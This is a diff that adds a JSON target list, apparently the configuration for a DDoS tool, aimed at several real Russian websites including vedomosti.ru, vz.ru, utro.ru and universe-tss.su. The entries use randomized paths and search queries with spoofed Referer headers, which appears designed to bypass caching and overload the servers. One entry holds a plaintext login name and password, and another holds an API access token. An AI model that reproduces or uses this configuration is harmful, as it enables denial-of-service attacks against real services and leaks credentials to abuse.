@@ -1,0 +1,77 @@
+{
+  "targets": [
+    {
+      "target": "https://universe-tss.su",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "login=submit&login_name=vladimir52&login_password=Vladimirovic%21%4022",
+        "headers": "{\"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"https://universe-tss.su/\"}",
+        "path_qs": "/main/",
+        "verb": "POST"
+      }
+    },
+    {
+      "target": "https://universe-tss.su",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://universe-tss.su/\"}",
+        "path_qs": "/main/page/{{int(1,1278)}}/"
+      }
+    },
+    {
+      "target": "https://utro.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://ulgov.ru/\"}",
+        "path_qs": "/more/search/{{int(1,9667)}}/?q={{str(1)}}"
+      }
+    },
+    {
+      "target": "https://api.vedomosti.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://www.vedomosti.ru/\", \"Accept\": \"application/json, text/plain, */*\", \"X-Access-Token\": \"9dad7f0da4881021bab6c99e9c14bae5ce08736b\"}",
+        "path_qs": "/v2/documents/search?query={{str(1)}}%20%D0%B5&sort=date&from={{int(1,1000)}}&limit=20"
+      }
+    },
+    {
+      "target": "https://jay.vedomosti.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://www.vedomosti.ru/\", \"Accept\": \"*/*\"}",
+        "path_qs": "/suggest?count=1000"
+      }
+    },
+    {
+      "target": "https://vkirove.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://vkirove.ru/\"}",
+        "path_qs": "/news/pagen{{int(1,3351)}}/"
+      }
+    },
+    {
+      "target": "https://vm.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "path_qs": "/search/site?q={{str(1)}}&page={{int(1,100)}}"
+      }
+    },
+    {
+      "target": "https://vz.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://vz.ru/\"}",
+        "path_qs": "/search/p{{int(1,100)}}/?q={{str(1)}}&{{str(4)}}={{str(4)}}"
+      }
+    },
+    {
+      "target": "https://vz.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://vz.ru/\"}",
+        "path_qs": "/inc/mainpage/{{int(1,2500)}}/?{{str(4)}}={{str(4)}}"
+      }
+    }
+  ]
+}
